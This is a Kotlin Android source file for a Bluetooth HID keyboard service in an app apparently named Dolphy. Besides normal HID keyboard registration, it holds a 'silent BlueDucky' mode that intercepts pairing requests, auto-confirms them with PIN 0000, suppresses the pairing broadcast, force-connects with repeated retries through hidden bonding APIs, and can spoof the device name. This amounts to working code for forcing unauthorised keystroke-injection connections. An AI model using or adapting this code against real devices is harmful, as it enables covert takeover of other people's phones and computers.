package com.droid.dolphy.hid

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothHidDevice
import android.bluetooth.BluetoothHidDeviceAppQosSettings
import android.bluetooth.BluetoothHidDeviceAppSdpSettings
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Binder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.droid.dolphy.R
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean












class KeyboardService : Service() {

    companion object {
        private val QOS: BluetoothHidDeviceAppQosSettings? by lazy {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                BluetoothHidDeviceAppQosSettings(
                    BluetoothHidDeviceAppQosSettings.SERVICE_BEST_EFFORT, 800, 0, 0, 0, 0
                )
            } else null
        }

        
        private const val TRANSPORT_BREDR = 1
        private const val SILENT_RETRY_MS = 1200L
        private const val SILENT_RETRY_MAX = 12
    }

    private val tag = "KeyboardService"
    private val mainHandler = Handler(Looper.getMainLooper())

    inner class LocalBinder : Binder() {
        fun getService(): KeyboardService = this@KeyboardService
    }

    private val binder = LocalBinder()

    private var bluetoothAdapter: BluetoothAdapter? = null
    private var hidDeviceProxy: BluetoothHidDevice? = null


    private var appRegistered = false


    private var pendingDeviceAddress: String? = null

    
    @Volatile
    private var silentBlueDuckyMode = false
    private val silentPairingReceiverRegistered = AtomicBoolean(false)
    private var silentRetryCount = 0
    private val silentRetryRunnable = object : Runnable {
        override fun run() {
            if (!silentBlueDuckyMode) return
            if (currentState == BluetoothProfile.STATE_CONNECTED) {
                Log.i(tag, "BlueDucky: connected — stop retries")
                return
            }
            if (silentRetryCount >= SILENT_RETRY_MAX) {
                Log.w(tag, "BlueDucky: max retries reached")
                return
            }
            silentRetryCount++
            Log.i(tag, "BlueDucky: retry connect #$silentRetryCount")
            initiateConnect()
            mainHandler.postDelayed(this, SILENT_RETRY_MS)
        }
    }

    
    private val silentPairingReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (!silentBlueDuckyMode) return
            when (intent.action) {
                BluetoothDevice.ACTION_PAIRING_REQUEST -> {
                    if (!hasConnectPermission()) return
                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    } ?: return
                    val target = pendingDeviceAddress
                    if (target != null && !device.address.equals(target, ignoreCase = true)) {
                        Log.d(tag, "BlueDucky: pairing for other device ${device.address}, ignore")
                        return
                    }
                    val variant = intent.getIntExtra(
                        BluetoothDevice.EXTRA_PAIRING_VARIANT,
                        BluetoothDevice.ERROR,
                    )
                    Log.i(tag, "BlueDucky: auto-confirm pairing variant=$variant for ${device.address}")
                    try {
                        when (variant) {
                            BluetoothDevice.PAIRING_VARIANT_PIN,
                            0,
                            7  -> {
                                val pinBytes = "0000".toByteArray(Charsets.UTF_8)
                                runCatching { device.setPin(pinBytes) }
                                runCatching {
                                    val m = device.javaClass.getMethod(
                                        "setPasskey",
                                        Int::class.javaPrimitiveType,
                                    )
                                    m.invoke(device, 0)
                                }
                            }
                            BluetoothDevice.PAIRING_VARIANT_PASSKEY_CONFIRMATION,
                            2, 3  -> {
                                runCatching { device.setPairingConfirmation(true) }
                            }
                            4, 5  -> {
                                runCatching { device.setPairingConfirmation(true) }
                            }
                            else -> {
                                runCatching { device.setPairingConfirmation(true) }
                                runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
                            }
                        }
                        try {
                            abortBroadcast()
                        } catch (_: Exception) {
                        }
                    } catch (t: Throwable) {
                        Log.w(tag, "BlueDucky: pairing auto-confirm failed: ${t.message}")
                    }
                }
                BluetoothDevice.ACTION_BOND_STATE_CHANGED -> {
                    if (!hasConnectPermission()) return
                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    } ?: return
                    val target = pendingDeviceAddress ?: return
                    if (!device.address.equals(target, ignoreCase = true)) return
                    val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.ERROR)
                    if (state == BluetoothDevice.BOND_BONDED) {
                        Log.i(tag, "BlueDucky: bond complete → proxy.connect")
                        mainHandler.post { forceProxyConnect(device) }
                    }
                }
            }
        }
    }

    private var connection: Connection? = null
    private var currentDevice: BluetoothDevice? = null
    private var currentState: Int = BluetoothProfile.STATE_DISCONNECTED



    private val profileServiceListener = object : BluetoothProfile.ServiceListener {
        @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
        override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
            if (profile != BluetoothProfile.HID_DEVICE) return
            Log.d(tag, "HID profile service connected")
            hidDeviceProxy = proxy as? BluetoothHidDevice
            registerApp()
        }

        override fun onServiceDisconnected(profile: Int) {
            if (profile != BluetoothProfile.HID_DEVICE) return
            Log.w(tag, "HID profile service disconnected")
            hidDeviceProxy = null
            appRegistered = false
        }
    }



    private val hidCallback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        object : BluetoothHidDevice.Callback() {

            @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
            override fun onAppStatusChanged(pluggedDevice: BluetoothDevice?, registered: Boolean) {
                super.onAppStatusChanged(pluggedDevice, registered)
                Log.d(tag, "onAppStatusChanged: registered=$registered device=${pluggedDevice?.address}")
                mainHandler.post {
                    appRegistered = registered
                    if (!registered) {
                        Log.w(tag, "HID app unregistered")
                        return@post
                    }
                    Log.i(tag, "HID app registered — initiating connect if device is pending")
                    initiateConnect()
                }
            }

            @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
            override fun onConnectionStateChanged(device: BluetoothDevice?, state: Int) {
                super.onConnectionStateChanged(device, state)
                val stateName = when (state) {
                    BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
                    BluetoothProfile.STATE_CONNECTING -> "CONNECTING"
                    BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
                    BluetoothProfile.STATE_DISCONNECTING -> "DISCONNECTING"
                    else -> "UNKNOWN($state)"
                }
                Log.d(tag, "onConnectionStateChanged: $stateName for ${device?.address}, proxy=${hidDeviceProxy != null}")
                if (device == null) return

                mainHandler.post {
                    currentDevice = device
                    currentState = state
                    when (state) {
                        BluetoothProfile.STATE_CONNECTED -> {
                            Log.d(tag, "Creating Connection and injecting proxy...")
                            if (silentBlueDuckyMode) {
                                Log.i(tag, "BlueDucky: HID CONNECTED — disabling silent mode")
                                stopSilentRetries()
                                mainHandler.postDelayed({ setSilentBlueDuckyMode(false) }, 1500L)
                            }
                            val proxy = hidDeviceProxy
                            if (proxy == null) {
                                Log.e(tag, "ERROR: hidDeviceProxy is null when connection established!")
                            }
                            connection = Connection(
                                this@KeyboardService,
                                device,
                                onCapsLock = { enabled -> listener?.onCapsLock(enabled) }
                            )

                            connection?.injectProxy(proxy)
                            Log.d(tag, "Connection injected, proxyProvided=${proxy != null}")
                            listener?.onConnection(connection!!)
                            listener?.onHidStateChanged(device, state)
                        }
                        BluetoothProfile.STATE_DISCONNECTED -> {
                            connection?.close()
                            connection = null
                            listener?.onHidStateChanged(device, state)
                        }
                        else -> {
                            listener?.onHidStateChanged(device, state)
                        }
                    }
                }
            }

            @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
            override fun onInterruptData(device: BluetoothDevice?, reportId: Byte, data: ByteArray) {
                super.onInterruptData(device, reportId, data)
                if (device != null) connection?.onInterruptData(device, reportId, data)
            }
        }
    } else null



    interface Listener {
        fun onConnection(connection: Connection) {}
        fun onCapsLock(enabled: Boolean) {}
        fun onHidStateChanged(device: BluetoothDevice, state: Int) {}
    }

    private var listener: Listener? = null
    fun setListener(l: Listener?) { listener = l }



    override fun onCreate() {
        super.onCreate()
        bluetoothAdapter = (getSystemService(BLUETOOTH_SERVICE) as BluetoothManager).adapter
        startForegroundIfNeeded()
    }

    override fun onDestroy() {
        stopSilentRetries()
        setSilentBlueDuckyMode(false)
        connection?.close()
        releaseHidProxy()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundIfNeeded()
        return START_STICKY
    }




    fun initialize() {
        if (appRegistered) return
        requestHidProxy()
    }






    fun setTargetDeviceAddress(address: String) {
        setSilentBlueDuckyMode(false)
        pendingDeviceAddress = address
        if (appRegistered) {
            initiateConnect()
        } else {
            if (hidDeviceProxy == null) requestHidProxy()
        }
    }





    fun connectDirect(address: String) {
        setSilentBlueDuckyMode(false)
        pendingDeviceAddress = address
        if (appRegistered) {
            initiateConnect()
        } else {
            if (hidDeviceProxy == null) requestHidProxy()
        }
    }

    
    fun connectSilentBlueDucky(address: String) {
        Log.i(tag, "connectSilentBlueDucky → $address")
        pendingDeviceAddress = address
        setSilentBlueDuckyMode(true)
        silentRetryCount = 0
        stopSilentRetries()

        if (appRegistered) {
            initiateConnect()
            mainHandler.postDelayed(silentRetryRunnable, SILENT_RETRY_MS)
        } else {
            if (hidDeviceProxy == null) requestHidProxy()
            mainHandler.postDelayed(silentRetryRunnable, SILENT_RETRY_MS)
        }
    }

    fun isSilentBlueDuckyMode(): Boolean = silentBlueDuckyMode

    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    fun disconnect() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
        stopSilentRetries()
        setSilentBlueDuckyMode(false)
        val conn = connection ?: return
        conn.close()
        connection = null
    }

    fun getCurrentConnection(): Connection? = connection

    fun getCurrentConnectionState(): Int = currentState

    fun getConnectedDevice(): BluetoothDevice? =
        if (currentState == BluetoothProfile.STATE_CONNECTED) currentDevice else null

    fun getPendingDeviceAddress(): String? = pendingDeviceAddress

    fun clearPendingDeviceAddress() {
        pendingDeviceAddress = null
    }

    fun removeBond(address: String) {
        if (!hasConnectPermission()) return
        try {
            val device = bluetoothAdapter?.getRemoteDevice(address) ?: return
            val method = device.javaClass.getMethod("removeBond")
            method.invoke(device)
            Log.i(tag, "removeBond called for $address")
        } catch (t: Throwable) {
            Log.w(tag, "removeBond failed: ${t.message}")
        }
    }







    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    private fun initiateConnect() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
        val address = pendingDeviceAddress ?: run {
            Log.d(tag, "initiateConnect: no pending device address")
            return
        }
        val proxy = hidDeviceProxy ?: run {
            Log.w(tag, "initiateConnect: proxy is null")
            return
        }
        if (!hasConnectPermission()) {
            Log.w(tag, "initiateConnect: missing BLUETOOTH_CONNECT permission")
            return
        }
        val device = try {
            bluetoothAdapter?.getRemoteDevice(address)
        } catch (e: IllegalArgumentException) {
            Log.w(tag, "initiateConnect: invalid address $address")
            null
        } ?: return

        if (silentBlueDuckyMode) {
            initiateSilentBlueDuckyConnect(device, proxy)
            return
        }

        val bondState = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
        if (bondState != BluetoothDevice.BOND_BONDED) {
            if (bondState == BluetoothDevice.BOND_BONDING) {
                Log.i(tag, "initiateConnect: waiting for bonding to finish for ${device.address}")
                return
            }
            val bondStarted = runCatching { device.createBond() }.getOrDefault(false)
            Log.i(
                tag,
                "initiateConnect: device not bonded (${device.address}), createBond started=$bondStarted"
            )
            return
        }

        forceProxyConnect(device)
    }

    
    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    private fun initiateSilentBlueDuckyConnect(device: BluetoothDevice, proxy: BluetoothHidDevice) {
        val bondState = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
        Log.i(
            tag,
            "BlueDucky connect: ${device.address} bond=$bondState registered=$appRegistered",
        )

        runCatching { bluetoothAdapter?.cancelDiscovery() }

        if (bondState == BluetoothDevice.BOND_BONDING) {
            Log.i(tag, "BlueDucky: cancel stuck bonding via removeBond")
            runCatching {
                device.javaClass.getMethod("cancelBondProcess").invoke(device)
            }
            runCatching {
                device.javaClass.getMethod("removeBond").invoke(device)
            }
        }

        val connected = forceProxyConnect(device)
        Log.i(tag, "BlueDucky: proxy.connect result=$connected")

        if (bondState == BluetoothDevice.BOND_NONE) {
            val bondOk = createBondSilent(device)
            Log.i(tag, "BlueDucky: silent createBond started=$bondOk")
        }

        mainHandler.postDelayed({
            if (silentBlueDuckyMode && currentState != BluetoothProfile.STATE_CONNECTED) {
                forceProxyConnect(device)
            }
        }, 400L)
    }

    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    private fun forceProxyConnect(device: BluetoothDevice): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return false
        val proxy = hidDeviceProxy ?: return false
        return try {
            runCatching { proxy.disconnect(device) }
            val ok = proxy.connect(device)
            Log.i(tag, "proxy.connect(${device.address}) → $ok")
            ok
        } catch (e: Exception) {
            Log.e(tag, "proxy.connect failed: ${e.message}")
            false
        }
    }

    
    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    private fun createBondSilent(device: BluetoothDevice): Boolean {
        val viaTransport = runCatching {
            val m = device.javaClass.getMethod("createBond", Int::class.javaPrimitiveType)
            m.invoke(device, TRANSPORT_BREDR) as? Boolean ?: false
        }.getOrDefault(false)
        if (viaTransport) return true
        return runCatching { device.createBond() }.getOrDefault(false)
    }

    private fun setSilentBlueDuckyMode(enabled: Boolean) {
        silentBlueDuckyMode = enabled
        if (enabled) {
            registerSilentPairingReceiver()
        } else {
            unregisterSilentPairingReceiver()
            stopSilentRetries()
        }
    }

    private fun stopSilentRetries() {
        mainHandler.removeCallbacks(silentRetryRunnable)
    }

    private fun registerSilentPairingReceiver() {
        if (!silentPairingReceiverRegistered.compareAndSet(false, true)) return
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_PAIRING_REQUEST)
            addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        try {
            ContextCompat.registerReceiver(
                this,
                silentPairingReceiver,
                filter,
                ContextCompat.RECEIVER_EXPORTED,
            )
            Log.i(tag, "BlueDucky: silent pairing receiver registered")
        } catch (t: Throwable) {
            silentPairingReceiverRegistered.set(false)
            Log.w(tag, "BlueDucky: register pairing receiver failed: ${t.message}")
        }
    }

    private fun unregisterSilentPairingReceiver() {
        if (!silentPairingReceiverRegistered.compareAndSet(true, false)) return
        try {
            unregisterReceiver(silentPairingReceiver)
            Log.i(tag, "BlueDucky: silent pairing receiver unregistered")
        } catch (_: Exception) {
        }
    }

    private fun requestHidProxy() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            Log.w(tag, "HID Device profile requires Android 9+")
            return
        }
        val adapter = bluetoothAdapter ?: run {
            Log.e(tag, "No Bluetooth adapter")
            return
        }
        if (!hasConnectPermission()) {
            Log.e(tag, "Missing BLUETOOTH_CONNECT permission")
            return
        }
        val ok = adapter.getProfileProxy(this, profileServiceListener, BluetoothProfile.HID_DEVICE)
        Log.i(tag, "getProfileProxy requested: ok=$ok")
    }

    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
    private fun registerApp() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
        Log.d(tag, "Registering HID app...")

        val prefs = getSharedPreferences("DolphyPrefs", Context.MODE_PRIVATE)
        val isSpoofingEnabled = prefs.getBoolean("is_name_spoofing_enabled", false)
        val spoofedName = prefs.getString("spoofed_name", Build.MODEL) ?: Build.MODEL
        val customHidName = prefs.getString("custom_hid_name", Build.MODEL) ?: Build.MODEL

        val deviceName = when {
            isSpoofingEnabled -> spoofedName
            else -> customHidName
        }


        if (hasConnectPermission()) {
            try {
                bluetoothAdapter?.name = deviceName
                Log.d(tag, "Changed adapter name to: $deviceName")
            } catch (e: Exception) {
                Log.w(tag, "Failed to change adapter name: ${e.message}")
            }
        }

        val sdp = BluetoothHidDeviceAppSdpSettings(
            deviceName,
            deviceName,
            deviceName,
            BluetoothHidDevice.SUBCLASS1_COMBO,
            comboDescriptor
        )

        try {
            hidDeviceProxy?.registerApp(
                sdp,
                null,
                QOS,
                Executors.newCachedThreadPool(),
                hidCallback
            )
        } catch (e: Exception) {
            Log.e(tag, "registerApp failed: ${e.message}")
        }
    }

    private fun releaseHidProxy() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
        try {
            val adapter = bluetoothAdapter ?: return
            adapter.closeProfileProxy(BluetoothProfile.HID_DEVICE, hidDeviceProxy as? BluetoothProfile ?: return)
            Log.i(tag, "HID proxy released")
        } catch (t: Throwable) {
            Log.w(tag, "releaseHidProxy error: ${t.message}")
        } finally {
            hidDeviceProxy = null
        }
    }

    private fun hasConnectPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.BLUETOOTH_CONNECT
            ) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun startForegroundIfNeeded() {
        try {
            val channelId = "hid_service_channel"
            val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        getString(R.string.hid_service_channel_name),
                        NotificationManager.IMPORTANCE_LOW
                    )
                )
                NotificationCompat.Builder(this, channelId)
                    .setContentTitle(getString(R.string.hid_service_notification_title))
                    .setContentText(getString(R.string.hid_service_notification_text))
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build()
            } else {
                @Suppress("DEPRECATION")
                NotificationCompat.Builder(this)
                    .setContentTitle(getString(R.string.hid_service_notification_title))
                    .setContentText(getString(R.string.hid_service_notification_text))
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build()
            }
            startForeground(1, notification)
        } catch (t: Throwable) {
            Log.w(tag, "startForeground failed: ${t.message}")
        }
    }
}

